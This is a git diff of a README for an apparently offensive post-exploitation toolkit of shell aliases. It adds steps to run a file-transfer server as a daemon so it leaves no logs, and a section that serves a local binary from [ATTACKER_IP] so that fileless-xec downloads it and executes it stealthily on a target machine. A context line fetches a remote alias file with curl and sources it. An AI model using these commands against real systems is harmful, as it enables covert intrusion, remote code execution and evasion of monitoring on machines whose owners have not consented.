@@ -12,6 +12,13 @@ bang.gitar $AA $AP
 ```
 This will start a `gitar` http server and copy to your clipboard a command line to run on remote. Run it, you can now upload and download file from remote easily (without further installations [see](https://github.com/ariary/gitar/blob/main/README.md#tldr---and-listen-music)). 
 
+#### Alternative
+Launch gitar as a daemon, and kill it later when you want (=>no logs)
+1. Start gitar: `bang.gitar.daemon $AA`(copy command line)
+2. paste command line on remote
+3. Do your stuff (`push`,`pull`, etc)
+4. kill gitar: `bang.gitar.kill`
+
 ### Share files safely
 
 Same as above + inside a container + using https for encryption
@@ -57,6 +64,14 @@ curl -s [NGROK_HTTPS_URL]/alias > /tmp/alias && source /tmp/alias && rm /tmp/ali
 
 ## `fileless-xec`
 
+### Exec binary from a local HTTP server
+
+This will launch an http server (to serve the local binary) and copy the `fileless-xec` command to paste on target machine:
+```
+bang.flx.client.cpy [ATTACKER_IP] [TARGET_PORT] [BINARY_NAME]
+```
+Now paste the command on target machine (to dl binary and stealthy execute it)
+
 ### Copy line to launch `fieleless-xec` stealth dropper
 
 This will copy command line on your clipboard to launch fileless-xec on remote. (Previously, uploaded it to the remote machine)
@@ -70,7 +85,7 @@ bang.flxscpy
 This will send a local binary to a remote listening `fileless-xec`. The binary will be then executed (stealthy) on remote
 
 ```
-bang.flxssend [TARGET_IP]] [TARGET_PORT] [binary]
+bang.flxssend [TARGET_IP] [TARGET_PORT] [binary]
 ```
 
 ## Webdav server
